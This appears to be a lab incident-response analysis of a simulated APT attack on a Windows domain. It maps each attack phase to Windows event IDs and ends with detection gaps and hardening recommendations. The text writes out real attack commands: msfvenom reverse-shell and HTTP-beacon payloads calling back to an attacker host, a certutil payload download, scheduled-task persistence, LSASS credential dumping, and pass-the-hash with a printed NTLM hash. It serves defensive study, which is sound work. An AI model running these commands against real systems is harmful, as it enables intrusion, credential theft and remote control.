# Technical Analysis – APT Attack Chain Simulation

**Incident ID:** IR-2026-06-10-APT
**Analysis Date:** 10 June 2026
**Environment:** Windows Enterprise Lab (Kali Linux, WS1, Domain Controller, Winlogbeat, Elasticsearch, Kibana, Velociraptor)

---

# 1. Introduction

This document provides a detailed technical analysis of the simulated Advanced Persistent Threat (APT) attack conducted within the laboratory environment. The investigation reconstructs attacker activities from initial compromise through command-and-control (C2) communications using Windows event logs, endpoint telemetry, and forensic artifacts.

The objective of the analysis is to identify attacker techniques, validate detection capabilities, evaluate security telemetry, and recommend improvements for enterprise monitoring.

---

# 2. Investigation Scope

The following systems and log sources were included in the investigation:

* WS1 Windows Workstation
* Windows Domain Controller (DC)
* Kali Linux attacker machine
* Windows Security Event Logs
* Windows System Event Logs
* Winlogbeat telemetry
* Kibana dashboards and searches
* Velociraptor hunt results
* Attacker-side payloads and command history

---

# 3. Attack Reconstruction

## Phase 1 – Reconnaissance

The attacker enumerated the laboratory network using network scanning techniques to identify active hosts and exposed services.

Example activity:

```bash
nmap -sV -O 192.168.1.0/24
```

No corresponding telemetry was available because the attacking Linux system was not instrumented with endpoint monitoring.

### Observation

* No centralized logging for attacker infrastructure.
* Initial scanning activity remained outside defender visibility.

---

## Phase 2 – Initial Access and Payload Execution

A Meterpreter reverse TCP payload was generated and delivered to the workstation.

Payload generation:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
LHOST=192.168.1.5 LPORT=4444 \
-f exe -o shell.exe
```

The payload was downloaded and executed from:

```
C:\Users\Public\shell.exe
```

### Detection Evidence

* Windows Event ID: **4688**
* Process Name: `shell.exe`
* Parent Process: `cmd.exe`
* Execution Path: `C:\Users\Public\shell.exe`

### Security Impact

Execution from a publicly writable directory is highly suspicious and frequently associated with malware staging.

---

## Phase 3 – Persistence

Persistence was established through creation of a scheduled task.

Command executed:

```cmd
schtasks /create /tn "Updater" ^
/tr "C:\Users\Public\shell.exe" ^
/sc daily /st 09:00 /f
```

### Detection Evidence

* Windows Event ID: **4698**
* Task Name: `Updater`
* Action: Execute `shell.exe`

### Security Impact

The scheduled task ensures automatic execution after reboot or at scheduled intervals, providing long-term persistence.

---

## Phase 4 – Privilege Escalation

The attacker escalated privileges using a UAC bypass technique followed by SYSTEM token acquisition.

Observable behavior included:

* `eventvwr.exe`
* Elevated `cmd.exe`
* Subsequent SYSTEM-level processes

### Detection Indicators

* Event ID: **4688**
* Suspicious parent-child relationship:

  * `eventvwr.exe`
  * `cmd.exe`

### Security Impact

SYSTEM privileges provide unrestricted access to the operating system and sensitive security components.

---

## Phase 5 – Credential Access

After obtaining SYSTEM privileges, credentials were extracted from LSASS memory.

Example Meterpreter commands:

```text
load kiwi
creds_all
```

### Detection Evidence

* Windows Event ID: **4663**
* Access Target: `lsass.exe`
* Access Mask: `0x1FFFFF`

### Observed Credential

```
Domain: NATION
User: Administrator
NTLM Hash:
2906d851e56454c1a699b58709c46497
```

### Security Impact

Compromise of administrator hashes enables authentication attacks without knowledge of plaintext passwords.

---

## Phase 6 – Lateral Movement

Using pass-the-hash authentication, the attacker pivoted from WS1 to the Domain Controller.

Example command:

```bash
impacket-psexec \
-hashes :2906d851e56454c1a699b58709c46497 \
nation/administrator@192.168.1.10
```

### Detection Evidence

Observed Windows events included:

| Event ID | Description                 |
| -------- | --------------------------- |
| 4624     | Network Logon (Type 3)      |
| 4672     | Special Privileges Assigned |
| 5140     | ADMIN$ Share Access         |
| 7045     | Service Installation        |
| 4688     | PSEXESVC Execution          |

### Indicators

* Source IP: `192.168.1.5`
* Authentication: NTLM
* Temporary Service: `PSEXESVC`

### Security Impact

Successful lateral movement expanded attacker control from a workstation to the Domain Controller.

---

## Phase 7 – Command and Control

A Meterpreter HTTP payload was generated and deployed to establish persistent communication.

Payload generation:

```bash
msfvenom \
-p windows/meterpreter/reverse_http \
LHOST=192.168.1.5 \
LPORT=8081 \
-f exe \
-o beacon.exe
```

Download command:

```cmd
certutil -urlcache -f \
http://192.168.1.5:8080/beacon.exe \
C:\Users\Public\beacon.exe
```

Execution:

```cmd
C:\Users\Public\beacon.exe
```

### Detection Evidence

* Event ID: **4688**
* `certutil.exe`
* `beacon.exe`

If Sysmon is installed:

* Event ID: **3**
* Destination IP: `192.168.1.5`
* Destination Port: `8081`

### Security Impact

The HTTP beacon provides persistent remote access while blending with common outbound web traffic.

---

# 4. Detection Performance

| Attack Stage         | Primary Detection             | Status   |
| -------------------- | ----------------------------- | -------- |
| Payload Execution    | Event 4688                    | Detected |
| Persistence          | Event 4698                    | Detected |
| Privilege Escalation | Event 4688                    | Detected |
| Credential Access    | Event 4663                    | Detected |
| Lateral Movement     | Events 4624, 4672, 5140, 7045 | Detected |
| HTTP Beacon          | Event 4688 / Sysmon 3         | Detected |

Average alert latency during the simulation was less than five seconds.

---

# 5. Indicators of Compromise

## Network Indicators

* `192.168.1.5`
* TCP/4444
* TCP/8080
* TCP/8081
* TCP/445

## File Indicators

* `C:\Users\Public\shell.exe`
* `C:\Users\Public\beacon.exe`
* `C:\Windows\Temp\PSEXESVC.exe`

## Process Indicators

* `shell.exe`
* `beacon.exe`
* `certutil.exe`
* `PSEXESVC.exe`
* `cmd.exe`

## Persistence

* Scheduled Task: `Updater`

---

# 6. Forensic Artifacts

| Artifact            | Description                            |
| ------------------- | -------------------------------------- |
| Security.evtx (WS1) | Process creation and credential access |
| Security.evtx (DC)  | Authentication and lateral movement    |
| System.evtx         | Service installation events            |
| shell.exe           | Reverse shell payload                  |
| beacon.exe          | HTTP command-and-control payload       |
| PSEXESVC.exe        | Remote execution service               |
| Scheduled Task XML  | Persistence mechanism                  |
| Velociraptor Hunts  | Process, file, and network evidence    |

---

# 7. Security Gaps

The investigation identified several opportunities to improve detection coverage:

* Sysmon was not deployed on all endpoints.
* Some Event ID 4688 records lacked command-line arguments.
* PowerShell Script Block Logging was not fully enabled.
* File hashes were not automatically collected.
* Linux attacker activity lacked telemetry.
* Application control policies did not restrict execution from user-writable directories.

---

# 8. Recommendations

## Critical

* Deploy Sysmon using a mature enterprise configuration.
* Enable command-line auditing for process creation.
* Enable PowerShell Script Block Logging.
* Block execution from `C:\Users\Public` and temporary directories.

## High

* Implement Credential Guard.
* Restrict NTLM authentication where operationally feasible.
* Monitor scheduled task creation continuously.
* Alert on execution of `certutil.exe` with URL download arguments.

## Medium

* Collect cryptographic hashes for executed files.
* Instrument Linux systems with centralized logging.
* Schedule periodic Velociraptor hunts.

---

# 9. Conclusion

The technical investigation demonstrates that the simulated APT attack successfully progressed through execution, persistence, privilege escalation, credential access, lateral movement, and HTTP-based command-and-control phases.

Windows Security logs combined with Winlogbeat, Kibana, and Velociraptor provided strong visibility into attacker behavior and enabled timely detection of critical events. Enhancing endpoint telemetry through Sysmon deployment, richer command-line logging, and PowerShell auditing would further improve forensic depth and detection accuracy.

Overall, the laboratory validates that a well-configured centralized logging and endpoint monitoring strategy can effectively identify and investigate sophisticated multi-stage attacks in near real time.
